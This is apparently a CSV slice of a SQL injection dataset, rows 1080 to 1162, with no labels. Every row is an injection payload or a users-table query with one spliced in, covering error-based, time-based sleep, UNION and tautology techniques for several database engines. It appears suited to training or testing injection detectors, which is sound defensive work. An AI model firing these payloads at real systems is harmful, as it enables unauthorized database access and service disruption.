"1080","select * from users WHERE username = ""-4248 where 3288 = 3288 or username = ""1\' ) ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( \'cgiu\' = \'cgiu"""
"1081","select * from users WHERE username = ""-9644 ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-3613%\' ) or username = ""1"" and username = ""1\' and username = ""-8007\' ) ) as bgpp where 9555 = 9555"
"1082","select case when 1574 = 5523 then 1 else null end--"
"1083","end"
"1084","1'+ ( select 'vddk' where 6961 = 6961"
"1085","-5243"" where 2105 = 2105 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"
"1086","1'+ ( select 'wsjk' where 3291 = 3291"
"1087","select * from users WHERE username = ""1\' ) ) as eltx where 9955 = 9955 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" or username = ""-2951 or username = ""-7199\'"
"1088","select * from users WHERE username = ""-1344 ) as gqgi where 2545 = 2545 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and ( \'ulkq\' = \'ulkq"" and username = ""-6353%\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"1089","select * from users WHERE username = ""1"" and username = ""1\'+ ( select oljg where 2006 = 2006 or username = ""-6523"" and username = ""-7242\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"1090","1 ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( 5281 = 5281"
"1091","select * from users WHERE username = ""-6661\' ) ) || 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""-2756\' where 6156 = 6156 and username = ""-1549\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"1092","select * from users WHERE username = ""1 or username = ""-4610\' ) ) and username = ""1\' ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )"
"1093","1"" ) ) as bovm where 5560 = 5560 union all select null,null,null,null,null,null,null#"
"1094","select * from users WHERE username = ""1\'|| ( select \'yucg\' where 2576 = 2576 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) ) ||\'"" or username = ""-1254"""
"1095","select * from users where id = '1' *$ . or 1 = 1 -- 1'"
"1096","select * from users WHERE username = ""-2992\' ) ) and 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and username = ""-5313\' ) ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )"
"1097","select * from users WHERE username = ""-5863"" or username = ""1%\' ) ) and ( ( \'%\' = \'"" or username = ""1 ) ) )"
"1098","select * from users WHERE username = ""-1021 ) as erjh where 7845 = 7845 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"" and username = ""-3185\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )"
"1099","select * from users WHERE username = ""-3499\' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) or username = ""1%"" or username = ""1\' ) )"
"1100","select * from users WHERE username = ""-6665\' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'winx\' = \'winx"" or username = ""1\' )"
"1101","-8238' ) ) union all select 9797,9797,9797,9797,9797,9797,9797,9797#"
"1102","1%' and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and '%' = '"
"1103","1' ) as ohnu where 4097 = 4097 union all select null,null,null,null,null,null,null,null,null--"
"1104","select * from users WHERE username = ""-3424\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""1 ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 4694 = 4694"""
"1105","select * from users WHERE username = ""1 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""-6353%\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"1106","1' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'mymg' = 'mymg"
"1107","-3102 ) union all select 6707,6707,6707,6707--"
"1108","1"" union all select null,null#"
"1109","select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 --"" or username = ""1"" and username = ""-3733\' ) ) or username = ""-6190\' ) where 2621 = 2621 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"1110","1%' ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #"
"1111","1' where 5103 = 5103"
"1112","1 ) as amgf where 4308 = 4308 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) --"
"1113","1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 'wuux' = 'wuux"
"1114","1%' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #"
"1115","1"" ) ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ""oxvw"" = ""oxvw"
"1116","1"" ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #"
"1117","select * from users WHERE username = ""1 ) ) ) or username = ""-1641\' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'vgcb\' like \'vgcb"""
"1118","select * from users WHERE username = ""1\'+ ( select \'ueak\' where 7329 = 7329 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" and username = ""-3880 ) and ( 5194 = 5194"""
"1119","select * from users WHERE username = ""-2374 ) and ( 2576 = 2576"" or username = ""-8069\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( \'qbvz\' = \'qbvz"""
"1120","1"" ) ) ) union all select null,null,null,null#"
"1121","select * from users WHERE username = ""1\'+ ( select onzd where 8452 = 8452 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) ) +\'"" and username = ""1 ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"1122","select * from users WHERE username = ""-6720\' ) ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and username = ""-9564 or username = ""-9263\' ) as qodg where 6798 = 6798 and 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --"""
"1123","1' ) as pfwt where 8448 = 8448 union all select null,null,null,null,null,null,null,null,null#"
"1124","select * from users WHERE username = ""-9564 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""-7323%"""
"1125","' AND 1=1 UNION SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1))x--"
"1126","-9711'+ ( select 'ckpj' where 8338 = 8338 union all select 8338--"
"1127","select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 or username = ""-2756\' where 6156 = 6156 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-4610\' ) )"
"1128","select * from users WHERE username = ""-1344 ) as gqgi where 2545 = 2545 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-9987 ) ) )"
"1129","1'+ ( select 'idmr' where 5029 = 5029 union all select null,null,null,null,null,null--"
"1130","select * from users WHERE username = ""1\' ) ) or username = ""1\' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( \'hcpo\' like \'hcpo"""
"1131","select * from users WHERE username = ""1\'|| ( select \'vvpn\' from dual where 7011 = 7011 or username = ""-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-2783%\' ) )"
"1132","1"" ) ) ) or sleep ( 5 ) #"
"1133","select * from users WHERE username = ""-5863"" and ( ( 5139 = 5139"" or username = ""-1254"" and username = ""1\' ) ) )"
"1134","1"" ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #"
"1135","select * from users WHERE username = ""-6190\' ) where 2621 = 2621 or username = ""1%\' ) ) ) and username = ""-6190\' ) where 2621 = 2621 or-- 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"""
"1136","1' ) ) and make_set ( 8403 = 8403,8899 ) and ( ( 'sxgl' = 'sxgl"
"1137","select * from users WHERE username = ""1\' ) ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) or username = ""-7072\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and ( ( ( \'btjx\' = \'btjx"""
"1138","select * from users WHERE username = ""1\' ) ) as plbt where 4368 = 4368 and username = ""-7430\' ) as xfah where 1596 = 1596 and username = ""-5863"""
"1139","select * from users WHERE username = ""-4582 ) ) as gvfo where 8885 = 8885 or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" and username = ""-6036 ) ) ) and ( ( ( 6723 = 6723"""
"1140","select * from users WHERE username = ""-7199\' or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --"" or username = ""1"" or username = ""1%\' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )"
"1141","1"" ) ) as swwb where 4244 = 4244"
"1142","1"" ) rlike sleep ( 5 ) #"
"1143","select * from users WHERE username = ""-3859 ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 5846 = 5846"" and username = ""1\' ) where 4277 = 4277"
"1144","1' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) )"
"1145","1%"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --"
"1146","-1844"" where 7948 = 7948 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --"
"1147","select * from users WHERE username = ""1%"" or username = ""1\' ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( \'qtul\' like \'qtul"""
"1148","-9572%"" ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""%"" = """
"1149","1"" ) as aifd where 5962 = 5962"
"1150","select * from users WHERE username = ""1\'+ ( select onzd where 8452 = 8452 or username = ""-6523"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ""bwrb"" like ""bwrb"""
"1151","1' ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) and ( 'rqyz' = 'rqyz"
"1152","select * from users WHERE username = ""1\' ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) or username = ""-1344 ) as gqgi where 2545 = 2545"
"1153","select * from users WHERE username = ""1 ) or username = ""1 ) where 6039 = 6039 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"""
"1154","1' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'xazf' = 'xazf"
"1155","select * from users WHERE username = ""-5863"" or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and username = ""-4582 ) ) as gvfo where 8885 = 8885 and username = ""-6036 ) ) )"
"1156","call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'tmdj' like 'tmdj"
"1157","select * from users WHERE username = ""-7072\' ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" and username = ""-2733\' ) ) ) and ( ( ( \'btjx\' = \'btjx"" or username = ""-6190\' ) where 2621 = 2621"
"1158","select * from users WHERE username = ""-3978 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --"" and username = ""-2992\' ) ) or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric )"
"1159","-6996%"" or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #"
"1160","1', ( select ( case when ( 4209 = 5879 ) then 1 else 4209* ( select 4209 from information_schema.character_sets ) end ) )"
"1161","-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--"
"1162","select * from users WHERE username = ""1 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) "" or username = ""1\' ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( \'mfmk\' = \'mfmk"""
